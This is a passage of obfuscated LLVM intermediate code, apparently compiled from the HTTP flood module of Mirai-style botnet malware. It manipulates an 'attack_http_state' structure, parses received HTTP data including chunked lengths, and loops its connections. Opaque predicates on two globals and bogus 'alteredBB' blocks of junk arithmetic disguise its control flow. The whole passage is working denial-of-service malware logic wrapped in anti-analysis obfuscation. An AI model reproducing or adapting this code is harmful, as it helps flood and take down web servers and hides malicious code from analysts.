  %3601 = call i32 @util_strlen(i8* %3600)
  %3602 = sext i32 %3601 to i64
  %3603 = getelementptr inbounds i8, i8* %3592, i64 %3602
  %3604 = call i32 @util_strcpy(i8* %3603, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.14, i32 0, i32 0))
  %3605 = load i32, i32* %61, align 4
  %3606 = add nsw i32 %3605, 3
  %3607 = load i32, i32* %60, align 4
  %3608 = add nsw i32 %3607, %3606
  store i32 %3608, i32* %60, align 4
  %3609 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3610 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3609, i32 0, i32 18
  %3611 = load i32, i32* %60, align 4
  %3612 = sext i32 %3611 to i64
  %3613 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3610, i64 0, i64 %3612
  %3614 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3615 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3614, i32 0, i32 17
  %3616 = load i32, i32* %3615, align 4
  %3617 = load i32, i32* %60, align 4
  %3618 = sub nsw i32 %3616, %3617
  %3619 = call i32 @util_memsearch(i8* %3613, i32 %3618, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i32 0, i32 0), i32 1)
  store i32 %3619, i32* %61, align 4
  %3620 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3621 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3620, i32 0, i32 18
  %3622 = load i32, i32* %60, align 4
  %3623 = load i32, i32* %61, align 4
  %3624 = sub nsw i32 %3623, 1
  %3625 = add nsw i32 %3622, %3624
  %3626 = sext i32 %3625 to i64
  %3627 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3621, i64 0, i64 %3626
  store i8 0, i8* %3627, align 1
  %3628 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3629 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3628, i32 0, i32 16
  %3630 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3631 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3630, i32 0, i32 15
  %3632 = load i32, i32* %3631, align 4
  %3633 = sext i32 %3632 to i64
  %3634 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %3629, i64 0, i64 %3633
  %3635 = getelementptr inbounds [128 x i8], [128 x i8]* %3634, i32 0, i32 0
  %3636 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3637 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3636, i32 0, i32 16
  %3638 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3639 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3638, i32 0, i32 15
  %3640 = load i32, i32* %3639, align 4
  %3641 = sext i32 %3640 to i64
  %3642 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %3637, i64 0, i64 %3641
  %3643 = getelementptr inbounds [128 x i8], [128 x i8]* %3642, i32 0, i32 0
  %3644 = call i32 @util_strlen(i8* %3643)
  %3645 = sext i32 %3644 to i64
  %3646 = getelementptr inbounds i8, i8* %3635, i64 %3645
  %3647 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3648 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3647, i32 0, i32 18
  %3649 = load i32, i32* %60, align 4
  %3650 = sext i32 %3649 to i64
  %3651 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3648, i64 0, i64 %3650
  %3652 = call i32 @util_strcpy(i8* %3646, i8* %3651)
  %3653 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3654 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3653, i32 0, i32 15
  %3655 = load i32, i32* %3654, align 4
  %3656 = add nsw i32 %3655, 1
  store i32 %3656, i32* %3654, align 4
  %3657 = load i32, i32* @x.17
  %3658 = load i32, i32* @y.18
  %3659 = sub i32 %3657, 1
  %3660 = mul i32 %3657, %3659
  %3661 = urem i32 %3660, 2
  %3662 = icmp eq i32 %3661, 0
  %3663 = icmp slt i32 %3658, 10
  %3664 = or i1 %3662, %3663
  br i1 %3664, label %originalBBpart2595, label %originalBB553alteredBB

originalBBpart2595:                               ; preds = %originalBB553
  br label %3665

; <label>:3665:                                   ; preds = %originalBBpart2595, %3554, %3522
  %3666 = load i32, i32* @x.17
  %3667 = load i32, i32* @y.18
  %3668 = sub i32 %3666, 1
  %3669 = mul i32 %3666, %3668
  %3670 = urem i32 %3669, 2
  %3671 = icmp eq i32 %3670, 0
  %3672 = icmp slt i32 %3667, 10
  %3673 = or i1 %3671, %3672
  br i1 %3673, label %originalBB597, label %originalBB597alteredBB

originalBB597:                                    ; preds = %originalBB597alteredBB, %3665
  %3674 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3675 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3674, i32 0, i32 14
  store i32 -1, i32* %3675, align 4
  %3676 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3677 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3676, i32 0, i32 1
  store i8 10, i8* %3677, align 4
  %3678 = load i32, i32* @x.17
  %3679 = load i32, i32* @y.18
  %3680 = sub i32 %3678, 1
  %3681 = mul i32 %3678, %3680
  %3682 = urem i32 %3681, 2
  %3683 = icmp eq i32 %3682, 0
  %3684 = icmp slt i32 %3679, 10
  %3685 = or i1 %3683, %3684
  br i1 %3685, label %originalBBpart2599, label %originalBB597alteredBB

originalBBpart2599:                               ; preds = %originalBB597
  br label %3920

; <label>:3686:                                   ; preds = %3512
  br label %3687

; <label>:3687:                                   ; preds = %3686, %3501
  br label %3688

; <label>:3688:                                   ; preds = %3687, %3464
  %3689 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3690 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3689, i32 0, i32 14
  %3691 = load i32, i32* %3690, align 4
  %3692 = icmp eq i32 %3691, 0
  br i1 %3692, label %3693, label %3851

; <label>:3693:                                   ; preds = %3688
  %3694 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3695 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3694, i32 0, i32 13
  %3696 = load i32, i32* %3695, align 4
  %3697 = icmp eq i32 %3696, 1
  br i1 %3697, label %3698, label %3802

; <label>:3698:                                   ; preds = %3693
  %3699 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3700 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3699, i32 0, i32 18
  %3701 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3700, i32 0, i32 0
  %3702 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3703 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3702, i32 0, i32 17
  %3704 = load i32, i32* %3703, align 4
  %3705 = call i32 @util_memsearch(i8* %3701, i32 %3704, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  %3706 = icmp ne i32 %3705, -1
  br i1 %3706, label %3707, label %3801

; <label>:3707:                                   ; preds = %3698
  %3708 = load i32, i32* @x.17
  %3709 = load i32, i32* @y.18
  %3710 = sub i32 %3708, 1
  %3711 = mul i32 %3708, %3710
  %3712 = urem i32 %3711, 2
  %3713 = icmp eq i32 %3712, 0
  %3714 = icmp slt i32 %3709, 10
  %3715 = or i1 %3713, %3714
  br i1 %3715, label %originalBB601, label %originalBB601alteredBB

originalBB601:                                    ; preds = %originalBB601alteredBB, %3707
  %3716 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3717 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3716, i32 0, i32 18
  %3718 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3717, i32 0, i32 0
  %3719 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3720 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3719, i32 0, i32 17
  %3721 = load i32, i32* %3720, align 4
  %3722 = call i32 @util_memsearch(i8* %3718, i32 %3721, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %3722, i32* %62, align 4
  %3723 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3724 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3723, i32 0, i32 18
  %3725 = load i32, i32* %62, align 4
  %3726 = sub nsw i32 %3725, 2
  %3727 = sext i32 %3726 to i64
  %3728 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3724, i64 0, i64 %3727
  store i8 0, i8* %3728, align 1
  %3729 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3730 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3729, i32 0, i32 18
  %3731 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3730, i32 0, i32 0
  %3732 = load i32, i32* %62, align 4
  %3733 = call i32 @util_memsearch(i8* %3731, i32 %3732, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i32 0, i32 0), i32 1)
  %3734 = icmp ne i32 %3733, -1
  %3735 = load i32, i32* @x.17
  %3736 = load i32, i32* @y.18
  %3737 = sub i32 %3735, 1
  %3738 = mul i32 %3735, %3737
  %3739 = urem i32 %3738, 2
  %3740 = icmp eq i32 %3739, 0
  %3741 = icmp slt i32 %3736, 10
  %3742 = or i1 %3740, %3741
  br i1 %3742, label %originalBBpart2603, label %originalBB601alteredBB

originalBBpart2603:                               ; preds = %originalBB601
  br i1 %3734, label %3743, label %3753

; <label>:3743:                                   ; preds = %originalBBpart2603
  %3744 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3745 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3744, i32 0, i32 18
  %3746 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3747 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3746, i32 0, i32 18
  %3748 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3747, i32 0, i32 0
  %3749 = load i32, i32* %62, align 4
  %3750 = call i32 @util_memsearch(i8* %3748, i32 %3749, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i32 0, i32 0), i32 1)
  %3751 = sext i32 %3750 to i64
  %3752 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3745, i64 0, i64 %3751
  store i8 0, i8* %3752, align 1
  br label %3753

; <label>:3753:                                   ; preds = %3743, %originalBBpart2603
  %3754 = load i32, i32* @x.17
  %3755 = load i32, i32* @y.18
  %3756 = sub i32 %3754, 1
  %3757 = mul i32 %3754, %3756
  %3758 = urem i32 %3757, 2
  %3759 = icmp eq i32 %3758, 0
  %3760 = icmp slt i32 %3755, 10
  %3761 = or i1 %3759, %3760
  br i1 %3761, label %originalBB605, label %originalBB605alteredBB

originalBB605:                                    ; preds = %originalBB605alteredBB, %3753
  %3762 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3763 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3762, i32 0, i32 18
  %3764 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3763, i32 0, i32 0
  %3765 = call i32 @util_atoi(i8* %3764, i32 16)
  store i32 %3765, i32* %63, align 4
  %3766 = load i32, i32* %63, align 4
  %3767 = icmp eq i32 %3766, 0
  %3768 = load i32, i32* @x.17
  %3769 = load i32, i32* @y.18
  %3770 = sub i32 %3768, 1
  %3771 = mul i32 %3768, %3770
  %3772 = urem i32 %3771, 2
  %3773 = icmp eq i32 %3772, 0
  %3774 = icmp slt i32 %3769, 10
  %3775 = or i1 %3773, %3774
  br i1 %3775, label %originalBBpart2607, label %originalBB605alteredBB

originalBBpart2607:                               ; preds = %originalBB605
  br i1 %3767, label %3776, label %3779

; <label>:3776:                                   ; preds = %originalBBpart2607
  %3777 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3778 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3777, i32 0, i32 1
  store i8 1, i8* %3778, align 4
  br label %3920

; <label>:3779:                                   ; preds = %originalBBpart2607
  %3780 = load i32, i32* @x.17
  %3781 = load i32, i32* @y.18
  %3782 = sub i32 %3780, 1
  %3783 = mul i32 %3780, %3782
  %3784 = urem i32 %3783, 2
  %3785 = icmp eq i32 %3784, 0
  %3786 = icmp slt i32 %3781, 10
  %3787 = or i1 %3785, %3786
  br i1 %3787, label %originalBB609, label %originalBB609alteredBB

originalBB609:                                    ; preds = %originalBB609alteredBB, %3779
  %3788 = load i32, i32* %63, align 4
  %3789 = add nsw i32 %3788, 2
  %3790 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3791 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3790, i32 0, i32 14
  store i32 %3789, i32* %3791, align 4
  %3792 = load i32, i32* %62, align 4
  store i32 %3792, i32* %59, align 4
  %3793 = load i32, i32* @x.17
  %3794 = load i32, i32* @y.18
  %3795 = sub i32 %3793, 1
  %3796 = mul i32 %3793, %3795
  %3797 = urem i32 %3796, 2
  %3798 = icmp eq i32 %3797, 0
  %3799 = icmp slt i32 %3794, 10
  %3800 = or i1 %3798, %3799
  br i1 %3800, label %originalBBpart2619, label %originalBB609alteredBB

originalBBpart2619:                               ; preds = %originalBB609
  br label %3801

; <label>:3801:                                   ; preds = %originalBBpart2619, %3698
  br label %3850

; <label>:3802:                                   ; preds = %3693
  %3803 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3804 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3803, i32 0, i32 17
  %3805 = load i32, i32* %3804, align 4
  %3806 = load i32, i32* %59, align 4
  %3807 = sub nsw i32 %3805, %3806
  %3808 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3809 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3808, i32 0, i32 14
  store i32 %3807, i32* %3809, align 4
  %3810 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3811 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3810, i32 0, i32 14
  %3812 = load i32, i32* %3811, align 4
  %3813 = icmp eq i32 %3812, 0
  br i1 %3813, label %3814, label %3833

; <label>:3814:                                   ; preds = %3802
  %3815 = load i32, i32* @x.17
  %3816 = load i32, i32* @y.18
  %3817 = sub i32 %3815, 1
  %3818 = mul i32 %3815, %3817
  %3819 = urem i32 %3818, 2
  %3820 = icmp eq i32 %3819, 0
  %3821 = icmp slt i32 %3816, 10
  %3822 = or i1 %3820, %3821
  br i1 %3822, label %originalBB621, label %originalBB621alteredBB

originalBB621:                                    ; preds = %originalBB621alteredBB, %3814
  %3823 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3824 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3823, i32 0, i32 1
  store i8 1, i8* %3824, align 4
  %3825 = load i32, i32* @x.17
  %3826 = load i32, i32* @y.18
  %3827 = sub i32 %3825, 1
  %3828 = mul i32 %3825, %3827
  %3829 = urem i32 %3828, 2
  %3830 = icmp eq i32 %3829, 0
  %3831 = icmp slt i32 %3826, 10
  %3832 = or i1 %3830, %3831
  br i1 %3832, label %originalBBpart2623, label %originalBB621alteredBB

originalBBpart2623:                               ; preds = %originalBB621
  br label %3920

; <label>:3833:                                   ; preds = %3802
  %3834 = load i32, i32* @x.17
  %3835 = load i32, i32* @y.18
  %3836 = sub i32 %3834, 1
  %3837 = mul i32 %3834, %3836
  %3838 = urem i32 %3837, 2
  %3839 = icmp eq i32 %3838, 0
  %3840 = icmp slt i32 %3835, 10
  %3841 = or i1 %3839, %3840
  br i1 %3841, label %originalBB625, label %originalBB625alteredBB

originalBB625:                                    ; preds = %originalBB625alteredBB, %3833
  %3842 = load i32, i32* @x.17
  %3843 = load i32, i32* @y.18
  %3844 = sub i32 %3842, 1
  %3845 = mul i32 %3842, %3844
  %3846 = urem i32 %3845, 2
  %3847 = icmp eq i32 %3846, 0
  %3848 = icmp slt i32 %3843, 10
  %3849 = or i1 %3847, %3848
  br i1 %3849, label %originalBBpart2627, label %originalBB625alteredBB

originalBBpart2627:                               ; preds = %originalBB625
  br label %3850

; <label>:3850:                                   ; preds = %originalBBpart2627, %3801
  br label %3851

; <label>:3851:                                   ; preds = %3850, %3688
  %3852 = load i32, i32* @x.17
  %3853 = load i32, i32* @y.18
  %3854 = sub i32 %3852, 1
  %3855 = mul i32 %3852, %3854
  %3856 = urem i32 %3855, 2
  %3857 = icmp eq i32 %3856, 0
  %3858 = icmp slt i32 %3853, 10
  %3859 = or i1 %3857, %3858
  br i1 %3859, label %originalBB629, label %originalBB629alteredBB

originalBB629:                                    ; preds = %originalBB629alteredBB, %3851
  %3860 = load i32, i32* %59, align 4
  %3861 = icmp eq i32 %3860, 0
  %3862 = load i32, i32* @x.17
  %3863 = load i32, i32* @y.18
  %3864 = sub i32 %3862, 1
  %3865 = mul i32 %3862, %3864
  %3866 = urem i32 %3865, 2
  %3867 = icmp eq i32 %3866, 0
  %3868 = icmp slt i32 %3863, 10
  %3869 = or i1 %3867, %3868
  br i1 %3869, label %originalBBpart2631, label %originalBB629alteredBB

originalBBpart2631:                               ; preds = %originalBB629
  br i1 %3861, label %3870, label %3871

; <label>:3870:                                   ; preds = %originalBBpart2631
  br label %3920

; <label>:3871:                                   ; preds = %originalBBpart2631
  %3872 = load i32, i32* %59, align 4
  %3873 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3874 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3873, i32 0, i32 17
  %3875 = load i32, i32* %3874, align 4
  %3876 = sub nsw i32 %3875, %3872
  store i32 %3876, i32* %3874, align 4
  %3877 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3878 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3877, i32 0, i32 18
  %3879 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3878, i32 0, i32 0
  %3880 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3881 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3880, i32 0, i32 18
  %3882 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3881, i32 0, i32 0
  %3883 = load i32, i32* %59, align 4
  %3884 = sext i32 %3883 to i64
  %3885 = getelementptr inbounds i8, i8* %3882, i64 %3884
  %3886 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3887 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3886, i32 0, i32 17
  %3888 = load i32, i32* %3887, align 4
  %3889 = sext i32 %3888 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %3879, i8* %3885, i64 %3889, i32 1, i1 false)
  %3890 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3891 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3890, i32 0, i32 18
  %3892 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3893 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3892, i32 0, i32 17
  %3894 = load i32, i32* %3893, align 4
  %3895 = sext i32 %3894 to i64
  %3896 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3891, i64 0, i64 %3895
  store i8 0, i8* %3896, align 1
  %3897 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3898 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3897, i32 0, i32 17
  %3899 = load i32, i32* %3898, align 4
  %3900 = icmp eq i32 %3899, 0
  br i1 %3900, label %3901, label %3918

; <label>:3901:                                   ; preds = %3871
  %3902 = load i32, i32* @x.17
  %3903 = load i32, i32* @y.18
  %3904 = sub i32 %3902, 1
  %3905 = mul i32 %3902, %3904
  %3906 = urem i32 %3905, 2
  %3907 = icmp eq i32 %3906, 0
  %3908 = icmp slt i32 %3903, 10
  %3909 = or i1 %3907, %3908
  br i1 %3909, label %originalBB633, label %originalBB633alteredBB

originalBB633:                                    ; preds = %originalBB633alteredBB, %3901
  %3910 = load i32, i32* @x.17
  %3911 = load i32, i32* @y.18
  %3912 = sub i32 %3910, 1
  %3913 = mul i32 %3910, %3912
  %3914 = urem i32 %3913, 2
  %3915 = icmp eq i32 %3914, 0
  %3916 = icmp slt i32 %3911, 10
  %3917 = or i1 %3915, %3916
  br i1 %3917, label %originalBBpart2635, label %originalBB633alteredBB

originalBBpart2635:                               ; preds = %originalBB633
  br label %3920

; <label>:3918:                                   ; preds = %3871
  br label %3919

; <label>:3919:                                   ; preds = %3918
  br label %3464

; <label>:3920:                                   ; preds = %originalBBpart2635, %3870, %originalBBpart2623, %3776, %originalBBpart2599
  br label %3322

; <label>:3921:                                   ; preds = %3454, %originalBBpart2527
  br label %4022

; <label>:3922:                                   ; preds = %3299
  %3923 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3924 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3923, i32 0, i32 1
  %3925 = load i8, i8* %3924, align 4
  %3926 = zext i8 %3925 to i32
  %3927 = icmp eq i32 %3926, 10
  br i1 %3927, label %3928, label %4021

; <label>:3928:                                   ; preds = %3922
  br label %3929

; <label>:3929:                                   ; preds = %originalBBpart2643, %3928
  %3930 = call i32* @__errno_location() #7
  store i32 0, i32* %3930, align 4
  %3931 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3932 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3931, i32 0, i32 0
  %3933 = load i32, i32* %3932, align 4
  %3934 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %3935 = call i64 @recv(i32 %3933, i8* %3934, i64 10240, i32 16384)
  %3936 = trunc i64 %3935 to i32
  store i32 %3936, i32* %12, align 4
  %3937 = load i32, i32* %12, align 4
  %3938 = icmp eq i32 %3937, 0
  br i1 %3938, label %3939, label %3941

; <label>:3939:                                   ; preds = %3929
  %3940 = call i32* @__errno_location() #7
  store i32 104, i32* %3940, align 4
  store i32 -1, i32* %12, align 4
  br label %3941

; <label>:3941:                                   ; preds = %3939, %3929
  %3942 = load i32, i32* %12, align 4
  %3943 = icmp eq i32 %3942, -1
  br i1 %3943, label %3944, label %3978

; <label>:3944:                                   ; preds = %3941
  %3945 = load i32, i32* @x.17
  %3946 = load i32, i32* @y.18
  %3947 = sub i32 %3945, 1
  %3948 = mul i32 %3945, %3947
  %3949 = urem i32 %3948, 2
  %3950 = icmp eq i32 %3949, 0
  %3951 = icmp slt i32 %3946, 10
  %3952 = or i1 %3950, %3951
  br i1 %3952, label %originalBB637, label %originalBB637alteredBB

originalBB637:                                    ; preds = %originalBB637alteredBB, %3944
  %3953 = call i32* @__errno_location() #7
  %3954 = load i32, i32* %3953, align 4
  %3955 = icmp ne i32 %3954, 11
  %3956 = load i32, i32* @x.17
  %3957 = load i32, i32* @y.18
  %3958 = sub i32 %3956, 1
  %3959 = mul i32 %3956, %3958
  %3960 = urem i32 %3959, 2
  %3961 = icmp eq i32 %3960, 0
  %3962 = icmp slt i32 %3957, 10
  %3963 = or i1 %3961, %3962
  br i1 %3963, label %originalBBpart2639, label %originalBB637alteredBB

originalBBpart2639:                               ; preds = %originalBB637
  br i1 %3955, label %3964, label %3977

; <label>:3964:                                   ; preds = %originalBBpart2639
  %3965 = call i32* @__errno_location() #7
  %3966 = load i32, i32* %3965, align 4
  %3967 = icmp ne i32 %3966, 11
  br i1 %3967, label %3968, label %3977

; <label>:3968:                                   ; preds = %3964
  %3969 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3970 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3969, i32 0, i32 0
  %3971 = load i32, i32* %3970, align 4
  %3972 = call i32 @close(i32 %3971)
  %3973 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3974 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3973, i32 0, i32 0
  store i32 -1, i32* %3974, align 4
  %3975 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3976 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3975, i32 0, i32 1
  store i8 0, i8* %3976, align 4
  br label %3977

; <label>:3977:                                   ; preds = %3968, %3964, %originalBBpart2639
  br label %3995

; <label>:3978:                                   ; preds = %3941
  %3979 = load i32, i32* @x.17
  %3980 = load i32, i32* @y.18
  %3981 = sub i32 %3979, 1
  %3982 = mul i32 %3979, %3981
  %3983 = urem i32 %3982, 2
  %3984 = icmp eq i32 %3983, 0
  %3985 = icmp slt i32 %3980, 10
  %3986 = or i1 %3984, %3985
  br i1 %3986, label %originalBB641, label %originalBB641alteredBB

originalBB641:                                    ; preds = %originalBB641alteredBB, %3978
  %3987 = load i32, i32* @x.17
  %3988 = load i32, i32* @y.18
  %3989 = sub i32 %3987, 1
  %3990 = mul i32 %3987, %3989
  %3991 = urem i32 %3990, 2
  %3992 = icmp eq i32 %3991, 0
  %3993 = icmp slt i32 %3988, 10
  %3994 = or i1 %3992, %3993
  br i1 %3994, label %originalBBpart2643, label %originalBB641alteredBB

originalBBpart2643:                               ; preds = %originalBB641
  br label %3929

; <label>:3995:                                   ; preds = %3977
  %3996 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3997 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3996, i32 0, i32 1
  %3998 = load i8, i8* %3997, align 4
  %3999 = zext i8 %3998 to i32
  %4000 = icmp ne i32 %3999, 0
  br i1 %4000, label %4001, label %4020

; <label>:4001:                                   ; preds = %3995
  %4002 = load i32, i32* @x.17
  %4003 = load i32, i32* @y.18
  %4004 = sub i32 %4002, 1
  %4005 = mul i32 %4002, %4004
  %4006 = urem i32 %4005, 2
  %4007 = icmp eq i32 %4006, 0
  %4008 = icmp slt i32 %4003, 10
  %4009 = or i1 %4007, %4008
  br i1 %4009, label %originalBB645, label %originalBB645alteredBB

originalBB645:                                    ; preds = %originalBB645alteredBB, %4001
  %4010 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4011 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4010, i32 0, i32 1
  store i8 1, i8* %4011, align 4
  %4012 = load i32, i32* @x.17
  %4013 = load i32, i32* @y.18
  %4014 = sub i32 %4012, 1
  %4015 = mul i32 %4012, %4014
  %4016 = urem i32 %4015, 2
  %4017 = icmp eq i32 %4016, 0
  %4018 = icmp slt i32 %4013, 10
  %4019 = or i1 %4017, %4018
  br i1 %4019, label %originalBBpart2647, label %originalBB645alteredBB

originalBBpart2647:                               ; preds = %originalBB645
  br label %4020

; <label>:4020:                                   ; preds = %originalBBpart2647, %3995
  br label %4021

; <label>:4021:                                   ; preds = %4020, %3922
  br label %4022

; <label>:4022:                                   ; preds = %4021, %3921
  br label %4023

; <label>:4023:                                   ; preds = %4022, %3290
  br label %4024

; <label>:4024:                                   ; preds = %4023, %originalBBpart2173
  br label %4025

; <label>:4025:                                   ; preds = %4024, %3202, %originalBBpart2391, %1594, %originalBBpart2177, %1471, %1423
  %4026 = load i32, i32* %9, align 4
  %4027 = add nsw i32 %4026, 1
  store i32 %4027, i32* %9, align 4
  br label %1394

; <label>:4028:                                   ; preds = %1394
  %4029 = load i32, i32* @x.17
  %4030 = load i32, i32* @y.18
  %4031 = sub i32 %4029, 1
  %4032 = mul i32 %4029, %4031
  %4033 = urem i32 %4032, 2
  %4034 = icmp eq i32 %4033, 0
  %4035 = icmp slt i32 %4030, 10
  %4036 = or i1 %4034, %4035
  br i1 %4036, label %originalBB649, label %originalBB649alteredBB

originalBB649:                                    ; preds = %originalBB649alteredBB, %4028
  %4037 = load i32, i32* @x.17
  %4038 = load i32, i32* @y.18
  %4039 = sub i32 %4037, 1
  %4040 = mul i32 %4037, %4039
  %4041 = urem i32 %4040, 2
  %4042 = icmp eq i32 %4041, 0
  %4043 = icmp slt i32 %4038, 10
  %4044 = or i1 %4042, %4043
  br i1 %4044, label %originalBBpart2651, label %originalBB649alteredBB

originalBBpart2651:                               ; preds = %originalBB649
  br label %462

; <label>:4045:                                   ; preds = %104, %99, %94, %89
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %105
  store i32 0, i32* %10, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %143
  %4046 = load i8*, i8** %15, align 8
  %4047 = load i32, i32* %10, align 4
  %4048 = sext i32 %4047 to i64
  %4049 = getelementptr inbounds i8, i8* %4046, i64 %4048
  %4050 = load i8, i8* %4049, align 1
  %4051 = sext i8 %4050 to i32
  %_ = sub i32 %4051, 32
  %gen = mul i32 %_, 32
  %_2 = shl i32 %4051, 32
  %4052 = sub nsw i32 %4051, 32
  %4053 = trunc i32 %4052 to i8
  store i8 %4053, i8* %4049, align 1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %172
  %4054 = load i32, i32* %18, align 4
  %4055 = icmp sgt i32 %4054, 512
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %243
  %4056 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %4057 = load i32, i32* %9, align 4
  %4058 = sext i32 %4057 to i64
  %4059 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4056, i64 %4058
  %4060 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4059, i32 0, i32 6
